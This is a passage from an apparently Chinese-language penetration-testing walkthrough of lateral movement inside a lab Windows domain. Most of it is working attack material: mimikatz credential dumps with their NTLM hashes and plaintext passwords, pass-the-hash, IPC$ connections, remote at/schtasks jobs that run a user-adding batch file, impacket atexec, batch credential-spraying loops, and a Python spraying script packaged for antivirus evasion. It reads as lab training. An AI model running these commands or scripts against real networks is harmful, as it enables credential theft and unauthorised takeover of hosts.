	   Flags 60a00000    : pre_authent ; renewable ; forwarded ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     9dcc24ee4e7657fc4d657574d0bc30c6
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2	[...]
	   * Saved to file [0;3e7]-2-1-60a00000-WEBSERVER$@krbtgt-GOD.ORG.kirbi !
```

- `sekurlsa::pth /user:Administrateur /domain:god.org/ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd`

```shell
mimikatz # sekurlsa::pth /user:Administrateur /domain:god.org /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
user	: Administrateur
domain	: god.org
program	: cmd
impers.	: no
NTLM	: f193d757b4d487ab7e5a3743f038f713
  |  PID  2236
  |  TID  3268
  |  LSA Process is now R/W
  |  LUID 0 ; 4635928 (00000000:0046bd18)
  \_ msv1_0   - data copy @ 0000000001991D90 : OK !
  \_ kerberos - data copy @ 00000000008E98A8
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000000019538C8 (16) -> null

```

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-22.png)

执行

```shell
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL=" 
```

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-23.png)

##### 信息整理

当前机器名称——webserver.god.org

当前机器ip——192.168.3.31

当前机器用户账户密码

本地管理员账号密码 :
.\administraotr:admin!@#45
当前机器域用户密码 :

god\webadmin:admin!@#45

域——god.org

DCip——192.168.3.21

Username : administrator
* Domain   : god.org
 * Password : Admin12345

域内其他用户ip

192.168.3.25

192.168.3.29

192.168.3.30

192.168.3.32



### 案例 1-横向渗透明文传递 at&schtasks

在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？
这里仅介绍 at&schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。
获取到某域主机权限->minikatz 得到密码（明文，hash）->用到信息收集里面域用户的列表当做用户名字典->用到密码明文当做密码字典-》尝试连接->创建计划任务(at|schtasks)->执行文件可为后门或者相关命令

#### 利用流程

1. 建立 IPC 链接到目标主机
2. 拷贝要执行的命令脚本到目标主机
3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本
4. 删除 IPC 链接
   net use \\server\ipc$"password" /user:username # 工作组
     net use \\server\ipc$"password" /user:domain\username #域内
     dir \\xx.xx.xx.xx\C$\ # 查看文件列表
     copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件
     copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件
     net use \\xx.xx.xx.xx\C$\1.bat /del # 删除 IPC
     net view xx.xx.xx.xx # 查看对方共享



####  建立 IPC 常见的错误代码

  （1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限
  （2）51：网络问题，Windows 无法找到网络路径
  （3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有
  防火墙等问题
  （4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$
  （5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除
  （6）1326：账号密码错误
  （7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况
  （8）2242：用户密码过期，目标有账号策略，强制定期更改密码

####   建立 IPC 失败的原因

  （1）目标系统不是 NT 或以上的操作系统
  （2）对方没有打开 IPC$共享
  （3）对方未开启 139、445 端口，或者被防火墙屏蔽
  （4）输出命令、账号密码有错误

####   [at] & [schtasks]

```shell
  #at < Windows2012
  net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator 
  # 建立 ipc 连接：
  copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器
  at \\192.168.3.21 15:47 c:\add.bat #添加计划任务
  #schtasks >=Windows2012
  net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
  ministrator # 建立 ipc 连接：
  copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘
  schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F 
  #创建 adduser 任务
  对应执行文件
  schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务
  schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务
```

#### 已知信息

webserver的ip 192.168.3.31

webserver的账户密码

本地管理员账号密码 :
.\administraotr:admin!@#45
当前机器域用户密码 :

god\webadmin:admin!@#45

DC的ip为192.168.3.21

DC的账户密码

administrator

Admin12345

进一步信息收集

```shell
mimikatz # Using 'mimikatz.log' for logfile : OK

mimikatz # Using 'mimikatz.log' for logfile : OK

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : OWA2010CN-GOD$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:18
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : OWA2010CN-GOD$
	 * Domain   : GOD
	 * NTLM     : 4f6eeefae95e8371117af160395c7a7c
	 * SHA1     : d9e169e0b1843ee794ab416d4328fb8d37e9b2d0
	tspkg :	
	wdigest :	
	 * Username : OWA2010CN-GOD$
	 * Domain   : GOD
	 * Password : 25 99 55 b2 e1 7a 1b 85 bc bd 7c 2e d8 f8 9f f9 da 1b 65 93 3f 1a bd 97 f1 ee 85 ff 46 53 6a 1b 3f 19 59 8e c9 7c c6 73 27 d6 7b 47 82 b3 90 71 d1 27 1f d1 bf 6c c3 91 3e b6 73 54 e6 f4 f0 21 ac 5d fb e8 ee 54 9a 87 cc 47 0f e3 ee 6a aa c3 d0 63 ee bc 34 86 31 48 bc 2c 70 4e de d4 d5 46 44 79 2d 79 84 0d c9 92 06 ff 18 d0 62 a6 eb 74 f1 53 52 d6 dc 99 eb 25 bc a3 ae 43 3e 84 85 5b d3 3b cf e2 e8 a9 13 b0 33 87 35 c8 bc a5 5e 9e 67 5c f7 7d bb 1a a6 ac fe 15 d7 57 bc 61 2a 8b db 2e 2c 0d 2f ad 5f e3 e2 67 b3 49 b5 56 c5 ad 8c 9a 58 93 c6 41 46 7a dc 7b 56 bf 02 56 59 e1 51 6a da ff 61 d4 23 3c 3a 06 1b 35 5e 93 db 04 c5 6a 58 c5 30 1a c8 58 61 c8 5c b7 b1 3a a4 8c f8 25 b6 02 a4 0d eb f8 ec 28 4a 03 fd f3 0d 05 
	kerberos :	
	 * Username : owa2010cn-god$
	 * Domain   : GOD.ORG
	 * Password : 25 99 55 b2 e1 7a 1b 85 bc bd 7c 2e d8 f8 9f f9 da 1b 65 93 3f 1a bd 97 f1 ee 85 ff 46 53 6a 1b 3f 19 59 8e c9 7c c6 73 27 d6 7b 47 82 b3 90 71 d1 27 1f d1 bf 6c c3 91 3e b6 73 54 e6 f4 f0 21 ac 5d fb e8 ee 54 9a 87 cc 47 0f e3 ee 6a aa c3 d0 63 ee bc 34 86 31 48 bc 2c 70 4e de d4 d5 46 44 79 2d 79 84 0d c9 92 06 ff 18 d0 62 a6 eb 74 f1 53 52 d6 dc 99 eb 25 bc a3 ae 43 3e 84 85 5b d3 3b cf e2 e8 a9 13 b0 33 87 35 c8 bc a5 5e 9e 67 5c f7 7d bb 1a a6 ac fe 15 d7 57 bc 61 2a 8b db 2e 2c 0d 2f ad 5f e3 e2 67 b3 49 b5 56 c5 ad 8c 9a 58 93 c6 41 46 7a dc 7b 56 bf 02 56 59 e1 51 6a da ff 61 d4 23 3c 3a 06 1b 35 5e 93 db 04 c5 6a 58 c5 30 1a c8 58 61 c8 5c b7 b1 3a a4 8c f8 25 b6 02 a4 0d eb f8 ec 28 4a 03 fd f3 0d 05 
	ssp :	
	credman :	

Authentication Id : 0 ; 1555993 (00000000:0017be19)
Session           : Interactive from 1
User Name         : Administrator
Domain            : GOD
Logon Server      : OWA2010CN-GOD
Logon Time        : 2022/5/8 21:17:11
SID               : S-1-5-21-1218902331-2157346161-1782232778-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : GOD
	 * LM       : ac804745ee68ebea48116059303a4365
	 * NTLM     : ccef208c6485269c20db2cad21734fe7
	 * SHA1     : 58d1a25c09f4ee98209941b2b333fbe477d472a9
	tspkg :	
	 * Username : Administrator
	 * Domain   : GOD
	 * Password : Admin12345
	wdigest :	
	 * Username : Administrator
	 * Domain   : GOD
	 * Password : Admin12345
	kerberos :	
	 * Username : Administrator
	 * Domain   : GOD.ORG
	 * Password : Admin12345
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:18
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 48466 (00000000:0000bd52)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:15
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : OWA2010CN-GOD$
	 * Domain   : GOD
	 * NTLM     : 4f6eeefae95e8371117af160395c7a7c
	 * SHA1     : d9e169e0b1843ee794ab416d4328fb8d37e9b2d0
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:53
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : OWA2010CN-GOD$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:15
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : OWA2010CN-GOD$
	 * Domain   : GOD
	 * Password : 25 99 55 b2 e1 7a 1b 85 bc bd 7c 2e d8 f8 9f f9 da 1b 65 93 3f 1a bd 97 f1 ee 85 ff 46 53 6a 1b 3f 19 59 8e c9 7c c6 73 27 d6 7b 47 82 b3 90 71 d1 27 1f d1 bf 6c c3 91 3e b6 73 54 e6 f4 f0 21 ac 5d fb e8 ee 54 9a 87 cc 47 0f e3 ee 6a aa c3 d0 63 ee bc 34 86 31 48 bc 2c 70 4e de d4 d5 46 44 79 2d 79 84 0d c9 92 06 ff 18 d0 62 a6 eb 74 f1 53 52 d6 dc 99 eb 25 bc a3 ae 43 3e 84 85 5b d3 3b cf e2 e8 a9 13 b0 33 87 35 c8 bc a5 5e 9e 67 5c f7 7d bb 1a a6 ac fe 15 d7 57 bc 61 2a 8b db 2e 2c 0d 2f ad 5f e3 e2 67 b3 49 b5 56 c5 ad 8c 9a 58 93 c6 41 46 7a dc 7b 56 bf 02 56 59 e1 51 6a da ff 61 d4 23 3c 3a 06 1b 35 5e 93 db 04 c5 6a 58 c5 30 1a c8 58 61 c8 5c b7 b1 3a a4 8c f8 25 b6 02 a4 0d eb f8 ec 28 4a 03 fd f3 0d 05 
	kerberos :	
	 * Username : owa2010cn-god$
	 * Domain   : GOD.ORG
	 * Password : 25 99 55 b2 e1 7a 1b 85 bc bd 7c 2e d8 f8 9f f9 da 1b 65 93 3f 1a bd 97 f1 ee 85 ff 46 53 6a 1b 3f 19 59 8e c9 7c c6 73 27 d6 7b 47 82 b3 90 71 d1 27 1f d1 bf 6c c3 91 3e b6 73 54 e6 f4 f0 21 ac 5d fb e8 ee 54 9a 87 cc 47 0f e3 ee 6a aa c3 d0 63 ee bc 34 86 31 48 bc 2c 70 4e de d4 d5 46 44 79 2d 79 84 0d c9 92 06 ff 18 d0 62 a6 eb 74 f1 53 52 d6 dc 99 eb 25 bc a3 ae 43 3e 84 85 5b d3 3b cf e2 e8 a9 13 b0 33 87 35 c8 bc a5 5e 9e 67 5c f7 7d bb 1a a6 ac fe 15 d7 57 bc 61 2a 8b db 2e 2c 0d 2f ad 5f e3 e2 67 b3 49 b5 56 c5 ad 8c 9a 58 93 c6 41 46 7a dc 7b 56 bf 02 56 59 e1 51 6a da ff 61 d4 23 3c 3a 06 1b 35 5e 93 db 04 c5 6a 58 c5 30 1a c8 58 61 c8 5c b7 b1 3a a4 8c f8 25 b6 02 a4 0d eb f8 ec 28 4a 03 fd f3 0d 05 
	ssp :	
	credman :	
```

密码字典

```
admin！@#45
Admin12345
```



#### 横向渗透

##### at

由于域控DC是Win2008R2（< Windows2012），可以使用at命令。

```shell
  #at < Windows2012
  net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator 
  # 建立 ipc 连接：
  copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器
  at \\192.168.3.21 15:47 c:\add.bat #添加计划任务
```

![66-11](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-11.png)

![66-12](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-12.png)

![66-13](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-13.png)

![66-14](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-14.png)

![66-15](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-15.png)

##### schtasks

如果目标计算机>=Windows2012，需要使用schtasks命令。

![66-16](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-16.png)

![66-17](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-17.png)

当使用域用户登录时，copy是失败的，原因是权限不够，应该使用本地用户登录。

![66-18](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-18.png)

使用本地用户登录，执行如下命令

```shell
  net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
  ministrator # 建立 ipc 连接：
  copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘
  schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F 
  #创建 adduser 任务
  对应执行文件
  schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务
  schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务
```

![66-19](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-19.png)

![66-20](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-20.png)

```shell
 net user liandy  /del 不需要了的话可以删除
```

## 横向渗透明文传递 at&schtasks

### 案例 2-横向渗透明文 HASH 传递 atexec-impacket

#### atexec

- 优点：一句话命令，连接、提权全部搞定。
- 缺点：第三方工具，易被查杀，需要做免杀。
- atexec是Impacket网络协议工具包中的一个工具。
- Impacket工具包介绍：https://www.freebuf.com/sectool/175208.html

```shell
  atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"
  atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"
  atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
```

impacket工具包下载，可下载exe版本

- 地址：https://gitee.com/RichChigga/impacket-examples-windows

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-25.png)

执行命令，直接提权

```shell
atexec.exe god/administrator:Admin12345@192.168.3.21 "ver"
atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"
```

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-26.png)

## 横向渗透明文 HASH 传递 impacket

####   案例 3-横向渗透明文 HASH 传递批量利用-综合

##### 已知存活主机

```shell
192.168.3.21   #DC
192.168.3.25
192.168.3.29
192.168.3.30
192.168.3.31   #webserver
192.168.3.32   #sqlserver
```

##### 已知密码

```
admin！@#45
Admin12345
```

##### 批量检测

```shell
FOR /F %%i in (ips.txt) do net use \%%i\ipc$ "admin!@#45" /user:administrator 
#批量检测IP对应明文连接
FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami
#批量检测IP对应明文回显版
FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami 
#批量检测明文对应IP回显版
FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami 
#批量检测HASH对应IP回显版
```

##### 批量检测IP对应明文连接

```shell
FOR /F %%i in (ips.txt) do net use \%%i\ipc$ "admin!@#45" /user:administrator 
```

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-27.png)

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-28.png)

##### 批量检测IP对应明文回显版

```shell
FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami
```

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-29.png)

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-30.png)

发现网段内另两台主机192.168.3.29（win8.1x64  Jack-pc）、192.168.3.32（sqlserver）与webserver用了相同的账户密码，并且可以直接提权到system权限。

**可以进一步进行信息收集，略过！**



##### 批量检测明文对应IP回显版

```shell
FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami 
```

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-31.png)

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-32.png)

其实一开始就收集到了dc的密码，这里仅仅演示常规操作

##### 批量检测HASH对应IP回显版

收集hase进行连接

```shell
FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami 
#批量检测HASH对应IP回显版
```

##  横向渗透明文 HASH 传递批量利用-综合

#### 案例 4-横向渗透明文 HASH 传递批量利用-升级版

 案例3中都是批处理命令，只能遍历一个变量（不知道可不可遍历2个变量，反正我不会写），如果想要遍历多个变量，比如IP、用户名、密码等，可以写python脚本，免杀，使用Pyinstaller打包成exe文件，上传到目标机器运行。

脚本（最好写成多线程的）

```python
import os, time

ips = {
    '192.168.3.21',
    '192.168.3.25',
    '192.168.3.29',
    '192.168.3.30',
    '192.168.3.31',
    '192.168.3.33'
}

users = {
    'Administrator',
    'boss',
    'dbadmin',
    'fileadmin',
    'mack',
    'mary',
    'vpnadm',
    'webadmin'
}
passs = {
    'admin',
    'admin!@#45',
    'Admin12345'
}

for ip in ips:
    for user in users:
        for mima in passs:
            exec = "net use \\\\" + ip + '\ipc$ ' + mima + ' /user:god\\' + user
            print('--->' + exec + '<---')
            os.system(exec)
            time.sleep(1)
```

编译

```python
pip install pyinstaller
pyinstaller -F fuck_neiwang_001.py 生成可执行EXE
```

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-33.png)

缺失文件，执行失败（websverver）

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-34.png)

换成sqlserver

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-35.png)

![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-36.png)

后面，拷贝执行文件到目标主机，执行at或者schtasks命令创建任务即可